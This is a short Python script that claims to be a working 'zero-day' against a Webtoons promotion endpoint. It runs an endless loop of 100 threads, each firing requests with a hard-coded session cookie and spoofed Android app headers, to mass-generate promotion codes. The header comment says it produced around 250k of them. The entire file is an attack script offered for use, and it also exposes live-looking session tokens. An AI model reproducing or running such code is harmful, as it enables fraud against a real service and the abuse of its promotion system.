# this was the code of a working webtoons 0 day (generated around 250k codes (reason why they were reverted 💀))
from httpx          import get
from threading      import Thread, active_count

proxy = open("proxies.txt").read().splitlines()

def redeem():
    try:
        url     = f"https://m.webtoons.com/app/promotion/saveCompleteInfo?promotionName=en_discord_phase1_202305&dev=true&memo=(obv not putting my email)"

        headers = {
            "accept"            : "application/json, text/plain, */*",
            "accept-encoding"   : "gzip, deflate",
            "accept-language"   : "en-US,en;q=0.9,de-DE;q=0.8,de;q=0.7",
            "connection"        : "keep-alive",
            "cookie"            : "wtu=3e9bb7fb1d6cc4dcb1e1614145fce504; wtv=2; wts=1684173859009; needCCPA=false; needCOPPA=false; countryCode=DE; NEO_SES=\"f9UtJrCbvJDCdEVA5w/LmwYLC4agY7c9NgqKdpBNB70M3n/7j8nTrp9o20chaTzvnOhERuznIrldw7VDBDhCUX46qxllB35LxskK66I/l28n6kvPy6xNoHfQVSI7jBFYEov/w78USFBcz3V847kAGr5ayGG8lT4mr7a7XQCEIBAXezhd9+Bdh7cuERajR72otl8u3A7MlAq65o4RL2jClmuU8oFMFgm/vEqGDTTFHPnAWn+lvGkkp9SGwXy+x465zD+vRO6+POIByizOWFJS2eolBAeVR9c+GkuZhRIQtBmf8v1Ew64ItCsSFn0iRUOomPOBK1QbGPSfoAGCIN5L/u1k3hj42ac/YsYP7LTRQVogUNsIoBTcsZ1HW0hFwIKx8MvP+80KGEAWIVQBViLoiubWr8Jt+DdLhaUewSkfLm8=\"; NEO_CHK=PZTO+AJBfWvbsLj1CVg9sojtbyzqv9UI808pd9ZJCXc+KZitaH5y/9Ie2YyAhWc0EyYDKN+oXETHPAsgCSl5TEiAa2lPoTe+6rSDSEH5vMsQRHEBgYO07hjcRyDq0oC33bCAvrP+LcTOUN1ZU02h3g==; contentLanguage=en; locale=en; needGDPR=false; inAppNeedGDPR=true; inAppNeedCCPA=false; inAppNeedCOPPA=false; latGDPR=ADULT; latccGDPR=DE",#"wtu=3e9bb7fb1d6cc4dcb1e1614145fce504; wtv=2; wts=1684173859009; needCCPA=false; needCOPPA=false; countryCode=DE; NEO_SES=\"f9UtJrCbvJDCdEVA5w/LmwYLC4agY7c9NgqKdpBNB70M3n/7j8nTrp9o20chaTzvnOhERuznIrldw7VDBDhCUX46qxllB35LxskK66I/l28n6kvPy6xNoHfQVSI7jBFYEov/w78USFBcz3V847kAGr5ayGG8lT4mr7a7XQCEIBAXezhd9+Bdh7cuERajR72otl8u3A7MlAq65o4RL2jClmuU8oFMFgm/vEqGDTTFHPnAWn+lvGkkp9SGwXy+x465zD+vRO6+POIByizOWFJS2eolBAeVR9c+GkuZhRIQtBmf8v1Ew64ItCsSFn0iRUOomPOBK1QbGPSfoAGCIN5L/u1k3hj42ac/YsYP7LTRQVogUNsIoBTcsZ1HW0hFwIKx8MvP+80KGEAWIVQBViLoiubWr8Jt+DdLhaUewSkfLm8=\"; NEO_CHK=PZTO+AJBfWvbsLj1CVg9sojtbyzqv9UI808pd9ZJCXc+KZitaH5y/9Ie2YyAhWc0EyYDKN+oXETHPAsgCSl5TEiAa2lPoTe+6rSDSEH5vMsQRHEBgYO07hjcRyDq0oC33bCAvrP+LcTOUN1ZU02h3g==; contentLanguage=en; locale=en; needGDPR=false; inAppNeedGDPR=true; inAppNeedCCPA=false; inAppNeedCOPPA=false; latGDPR=ADULT; latccGDPR=DE",
            "host"              : "m.webtoons.com",
            "referer"           : "https://m.webtoons.com/app/promotion/read/en_discord_phase1_202305/progress?platform=APP_ANDROID",
            "sec-fetch-dest"    : "empty",
            "sec-fetch-mode"    : "cors",
            "sec-fetch-site"    : "same-origin",
            "user-agent"        : "Mozilla/5.0 (Linux; Android 7.1.2; SM-N976N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.131 Mobile Safari/537.36 linewebtoon/2.12.5 (GLOBAL; EAF)",
            "x-requested-with"  : "com.naver.linewebtoon"
        }   
        
        print(f"[+] ", get(url, headers=headers).text)

    except: 
        pass

 
while True:
    while active_count() < 100:
        Thread(target=redeem).start()
